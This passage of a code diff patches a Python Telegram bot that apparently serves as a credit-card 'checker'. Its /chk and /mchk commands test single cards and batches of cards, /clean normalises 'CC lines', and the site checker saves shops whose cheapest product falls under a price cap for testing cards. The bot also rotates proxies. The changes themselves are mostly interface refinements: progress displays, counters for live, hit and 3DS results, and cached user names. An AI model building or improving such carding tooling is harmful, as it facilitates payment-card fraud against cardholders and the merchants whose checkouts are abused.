+        await safe_callback_answer(callback_query, f"Selected: {choice_text}")
 
         try:
             await callback_query.message.edit_reply_markup(reply_markup=None)
@@ -2181,7 +2437,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
         batch_id = data.split(":", 1)[1].strip()
         user = callback_query.from_user
         if not user:
-            await callback_query.answer("User not found", show_alert=True)
+            await safe_callback_answer(callback_query, "User not found", show_alert=True)
             return
 
         cancel_info = cancel_user_mchk_batches(user.id, batch_ids=[batch_id])
@@ -2190,7 +2446,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
         msg_ids = set(cancel_info.get('msg_ids', []))
 
         if not cancelled_batches:
-            await callback_query.answer("Batch already stopped or finished", show_alert=True)
+            await safe_callback_answer(callback_query, "Batch already stopped or finished", show_alert=True)
             return
 
         for msg_id in msg_ids:
@@ -2209,10 +2465,10 @@ async def handle_callback(client, callback_query: CallbackQuery):
                 pass
             asyncio.create_task(cleanup_task_data(msg_id, delay=10))
 
-        await callback_query.answer(f"Stopped batch. Removed pending: {removed_pending}")
+        await safe_callback_answer(callback_query, f"Stopped batch. Removed pending: {removed_pending}")
         return
 
-    await callback_query.answer()  # Just acknowledge the callback
+    await safe_callback_answer(callback_query)  # Just acknowledge the callback
 
 # Database functions
 async def init_db():
@@ -2510,14 +2766,17 @@ async def get_random_site(user_id):
     
     return None
 
-async def save_user(user_id, first_name, username=None):
+async def save_user(user_id, first_name, username=None, full_name=None):
     """Save or update user in database"""
-    user_name_cache[user_id] = first_name
+    resolved_name = (full_name or first_name or 'User').strip()
+    user_name_cache[user_id] = resolved_name
+    user_display_cache[user_id] = resolved_name
     now_ts = utcnow()
     existing_mem = mem_users.get(user_id, {})
     mem_users[user_id] = {
         'user_id': user_id,
-        'first_name': first_name,
+        'first_name': resolved_name,
+        'full_name': resolved_name,
         'username': username,
         'last_seen': now_ts,
         'joined_at': existing_mem.get('joined_at', now_ts),
@@ -2530,7 +2789,8 @@ async def save_user(user_id, first_name, username=None):
                 {'user_id': user_id},
                 {
                     '$set': {
-                        'first_name': first_name,
+                        'first_name': resolved_name,
+                        'full_name': resolved_name,
                         'username': username,
                         'last_seen': now_ts
                     },
@@ -2621,7 +2881,7 @@ async def get_user_stats(user_id):
 async def start_command(client, message):
     """Start command handler"""
     user = message.from_user
-    await save_user(user.id, user.first_name, user.username)
+    await save_user(user.id, user.first_name, user.username, build_user_full_name(user))
     
     welcome_text = f"""👋 Welcome {user.first_name}!
 
@@ -2664,7 +2924,7 @@ Dead sites are automatically removed."""
 async def chk_command(client, message):
     """Single card check command"""
     user = message.from_user
-    await save_user(user.id, user.first_name, user.username)
+    await save_user(user.id, user.first_name, user.username, build_user_full_name(user))
     
     # Check if command has arguments or is reply
     if len(message.command) > 1:
@@ -2725,7 +2985,7 @@ async def chk_command(client, message):
 async def mchk_command(client, message):
     """Mass card check command (up to MAX_MASS_CHECK_CARDS cards)"""
     user = message.from_user
-    await save_user(user.id, user.first_name, user.username)
+    await save_user(user.id, user.first_name, user.username, build_user_full_name(user))
     
     # Get cards from command or reply
     cards = []
@@ -2835,7 +3095,7 @@ async def mchk_command(client, message):
     finally:
         mchk_pref_sessions.pop(pref_id, None)
 
-    selected_text = "Yes (HIT + LIVE + OTP)" if send_live_otp else "No (HIT only)"
+    selected_text = "Yes (HIT + LIVE + 3DS)" if send_live_otp else "No (HIT only)"
     try:
         await pref_message.edit_text(
             f"{pref_text}\n\n✅ Selected: {selected_text}",
@@ -2890,6 +3150,7 @@ async def mchk_command(client, message):
     batch_id = f"mchk_{user.id}_{int(time.time() * 1000)}_{random.randint(1000, 9999)}"
 
     # Create progress message
+    user_display_name = await get_cached_user_display_name(user.id)
     progress_text = f"""💳 <b>CARD PROCESSOR</b>
 ━━━━━━━━━━━━━━
 📂 Total Cards: {len(accepted_cards)}
@@ -2899,28 +3160,15 @@ async def mchk_command(client, message):
 • ✅ Live: 0
 • ❌ Dead: 0
 • 💎 Hits: 0
+• 🔐 3DS: 0
 • 🧩 Captcha: 0
+• 🚫 Failed: 0
 ━━━━━━━━━━━━━━
 ⏱️ Duration: 0.0s
-👤 {user.first_name}"""
+👤 {user_display_name}"""
 
     keyboard = InlineKeyboardMarkup([
-        [
-            InlineKeyboardButton(f"TOTAL {len(accepted_cards)}", callback_data="ignore"),
-            InlineKeyboardButton("CHECKED 0", callback_data="ignore")
-        ],
-        [
-            InlineKeyboardButton("HIT 0", callback_data="ignore"),
-            InlineKeyboardButton("LIVE 0", callback_data="ignore")
-        ],
-        [
-            InlineKeyboardButton("OTP 0", callback_data="ignore"),
-            InlineKeyboardButton("CAPTCHA 0", callback_data="ignore"),
-            InlineKeyboardButton("FAILED 0", callback_data="ignore")
-        ],
-        [
-            InlineKeyboardButton("⏹️ Stop", callback_data=f"stopmchk_batch:{batch_id}")
-        ]
+        [InlineKeyboardButton("⏹️ Stop", callback_data=f"stopmchk_batch:{batch_id}")]
     ])
     
     processing_msg = await message.reply_text(
@@ -3004,7 +3252,7 @@ async def mchk_command(client, message):
 async def clean_command(client, message):
     """Clean CC lines from replied text/txt and return normalized txt."""
     user = message.from_user
-    await save_user(user.id, user.first_name, user.username)
+    await save_user(user.id, user.first_name, user.username, build_user_full_name(user))
 
     lines = []
     tmp_file = None
@@ -3050,8 +3298,7 @@ async def clean_command(client, message):
 
         await message.reply_document(
             output_file,
-            caption=f"✅ Clean complete\nValid: {len(cleaned)}\nInvalid: {invalid}\nDuplicates removed: {max(0, len(lines)-len(cleaned)-invalid)}",
-            disable_web_page_preview=True
+            caption=f"✅ Clean complete\nValid: {len(cleaned)}\nInvalid: {invalid}\nDuplicates removed: {max(0, len(lines)-len(cleaned)-invalid)}"
         )
         os.remove(output_file)
     finally:
@@ -3062,7 +3309,7 @@ async def clean_command(client, message):
 async def stopmchk_command(client, message):
     """Stop all active mass-check batches for user."""
     user = message.from_user
-    await save_user(user.id, user.first_name, user.username)
+    await save_user(user.id, user.first_name, user.username, build_user_full_name(user))
 
     cancel_info = cancel_user_mchk_batches(user.id)
     cancelled_batches = cancel_info.get('cancelled_batches', [])
@@ -3099,7 +3346,7 @@ async def stopmchk_command(client, message):
 async def chksite_command(client, message):
     """Test sites and find working ones"""
     user = message.from_user
-    await save_user(user.id, user.first_name, user.username)
+    await save_user(user.id, user.first_name, user.username, build_user_full_name(user))
     
     # Get sites from command or reply
     sites = []
@@ -3133,31 +3380,21 @@ async def chksite_command(client, message):
     proxy = random.choice(user_proxies) if user_proxies else None
     
     # Create progress message
-    progress_text = f"""TASK
-USER: {user.first_name}
-START TIME: {datetime.now().strftime('%H:%M:%S')}
-ELAPSED: 0:00:00
-
-CREATED BY @still_alivenow"""
-
-    keyboard = InlineKeyboardMarkup([
-        [
-            InlineKeyboardButton(f"TOTAL {len(sites)}", callback_data="ignore"),
-            InlineKeyboardButton(f"CHECKED 0", callback_data="ignore")
-        ],
-        [
-            InlineKeyboardButton(f"HIT 0", callback_data="ignore"),
-            InlineKeyboardButton(f"LIVE 0", callback_data="ignore")
-        ],
-        [
-            InlineKeyboardButton(f"OTP 0", callback_data="ignore"),
-            InlineKeyboardButton(f"FAILED 0", callback_data="ignore")
-        ]
-    ])
+    user_display_name = await get_cached_user_display_name(user.id)
+    progress_text = f"""🌐 <b>SITE CHECKER</b>
+━━━━━━━━━━━━━━
+📂 Total Sites: {len(sites)}
+📤 Processed: 0
+━━━━━━━━━━━━━━
+🎯 <b>RESULTS BREAKDOWN</b>
+• ✅ Working Sites: 0
+• ❌ Not Working Sites: 0
+━━━━━━━━━━━━━━
+⏱️ Duration: 0.0s
+👤 {user_display_name}"""
     
     processing_msg = await message.reply_text(
         text=progress_text,
-        reply_markup=keyboard,
         parse_mode=ParseMode.HTML,
         disable_web_page_preview=True
     )
@@ -3192,6 +3429,17 @@ CREATED BY @still_alivenow"""
                 is_working, message_text, product_info = await test_site_connection(site_to_check, proxy)
 
             if is_working:
+                # Hard guard for price range during site check.
+                try:
+                    p = float(str((product_info or {}).get('price', '0')).replace(',', '').strip())
+                except Exception:
+                    return "skipped", site_to_check, product_info, "Invalid product price"
+
+                if p > MAX_SITE_PRODUCT_PRICE:
+                    return "skipped", site_to_check, product_info, (
+                        f"Cheapest product ${p:.2f} is above ${MAX_SITE_PRODUCT_PRICE:.2f}"
+                    )
+
                 saved, save_msg = await save_working_site(user.id, site_to_check, product_info)
                 if saved:
                     return "hit", site_to_check, product_info, None
@@ -3244,15 +3492,15 @@ CREATED BY @still_alivenow"""
             await f.write(f"{site} - {error}\n")
     
     # Send results
+    not_working_total = len(skipped_sites) + len(dead_sites)
     summary = f"""✅ Site Test Complete!
 
 📊 Results:
-🟢 Added: {len(working_sites)}
-🟡 Skipped (outside ${MIN_SITE_PRODUCT_PRICE:.2f}-${MAX_SITE_PRODUCT_PRICE:.2f}): {len(skipped_sites)}
-🔴 Dead: {len(dead_sites)}
+🟢 Working Sites: {len(working_sites)}
+🔴 Not Working Sites: {not_working_total}
 
-Only sites between ${MIN_SITE_PRODUCT_PRICE:.2f} and ${MAX_SITE_PRODUCT_PRICE:.2f} were added.
-Check /showsites to see them."""
+Only sites priced up to ${MAX_SITE_PRODUCT_PRICE:.2f} are saved.
+Check /showsites to see saved working sites."""
     
     await message.reply_document(
         result_file,
@@ -3268,7 +3516,7 @@ Check /showsites to see them."""
 async def addproxy_command(client, message):
     """Add proxy command"""
     user = message.from_user
-    await save_user(user.id, user.first_name, user.username)
+    await save_user(user.id, user.first_name, user.username, build_user_full_name(user))
     
     # Get proxies from command or reply
     proxies = []
@@ -3326,19 +3574,52 @@ async def addproxy_command(client, message):
             ok, reason = await validate_proxy_connection(proxy_value)
             return proxy_value, ok, reason
 
-    proxy_checks = await asyncio.gather(*[_validate_one(proxy_value) for proxy_value in normalized_proxies])
+    checked = 0
+    reachable_proxies = []
+    unreachable = []
+    total_to_check = len(normalized_proxies)
+    validate_tasks = [asyncio.create_task(_validate_one(proxy_value)) for proxy_value in normalized_proxies]
+
+    for done_task in asyncio.as_completed(validate_tasks):
+        proxy_value, ok, reason = await done_task
+        checked += 1
+        if ok:
+            reachable_proxies.append(proxy_value)
+        else:
+            unreachable.append((proxy_value, reason))
+
+        if checked == total_to_check or checked == 1 or checked % 5 == 0:
+            try:
+                await status_msg.edit_text(
+                    f"🔄 Validating proxies...\n"
+                    f"Checked: {checked}/{total_to_check}\n"
+                    f"Reachable: {len(reachable_proxies)}\n"
+                    f"Unreachable: {len(unreachable)}\n"
+                    f"Invalid format: {len(invalid_proxies)}",
+                    disable_web_page_preview=True
+                )
+            except Exception:
+                pass
 
     added = 0
     db_failed = 0
-    unreachable = []
-    for proxy_value, ok, reason in proxy_checks:
-        if not ok:
-            unreachable.append((proxy_value, reason))
-            continue
+    for idx, proxy_value in enumerate(reachable_proxies, 1):
         if await add_user_proxy(user.id, proxy_value):
             added += 1
         else:
             db_failed += 1
+
+        if idx == len(reachable_proxies) or idx == 1 or idx % 10 == 0:
+            try:
+                await status_msg.edit_text(
+                    f"💾 Saving validated proxies...\n"
+                    f"Saved: {idx}/{len(reachable_proxies)}\n"
+                    f"Added: {added}\n"
+                    f"DB failed: {db_failed}",
+                    disable_web_page_preview=True
+                )
+            except Exception:
+                pass
 
     details = [
         "✅ Proxy validation complete!",
@@ -3394,7 +3675,7 @@ async def showproxy_command(client, message):
         file_path = f"proxies_{user.id}.txt"
         async with aiofiles.open(file_path, 'w') as f:
             await f.write('\n'.join(proxies))
-        await message.reply_document(file_path, caption=f"📋 Your Proxies ({len(proxies)})", disable_web_page_preview=True)
+        await message.reply_document(file_path, caption=f"📋 Your Proxies ({len(proxies)})")
         os.remove(file_path)
     else:
         await message.reply_text(proxy_text, disable_web_page_preview=True)
@@ -3403,7 +3684,7 @@ async def showproxy_command(client, message):
 async def addsite_command(client, message):
     """Check site and get cheapest product"""
     user = message.from_user
-    await save_user(user.id, user.first_name, user.username)
+    await save_user(user.id, user.first_name, user.username, build_user_full_name(user))
     
     # Get site from command
     if len(message.command) > 1:
@@ -3493,8 +3774,8 @@ async def showsites_command(client, message):
     sites_text += f"\nTo remove sites, use:\n"
     sites_text += "`/rmvsite` - Show removal options"
     
-    # If list is too long, send as file
-    if len(sites_text) > 4000:
+    # Send as file when site count is large (30+) or text is too long.
+    if len(sites_list) >= 30 or len(sites_text) > 4000:
         file_path = f"sites_{user.id}.txt"
         async with aiofiles.open(file_path, 'w') as f:
             for site_entry in sites_list:
@@ -3504,8 +3785,7 @@ async def showsites_command(client, message):
                     await f.write(f"{site_entry}\n")
         await message.reply_document(
             file_path,
-            caption=f"📋 Your Working Sites ({len(sites_list)} sites)",
-            disable_web_page_preview=True
+            caption=f"📋 Your Working Sites ({len(sites_list)} sites, sent as file)"
         )
         os.remove(file_path)
     else:
@@ -3515,7 +3795,7 @@ async def showsites_command(client, message):
 async def rmvsite_command(client, message):
     """User command: Remove your own sites"""
     user = message.from_user
-    await save_user(user.id, user.first_name, user.username)
+    await save_user(user.id, user.first_name, user.username, build_user_full_name(user))
     
     # Parse command arguments
     args = message.text.split()
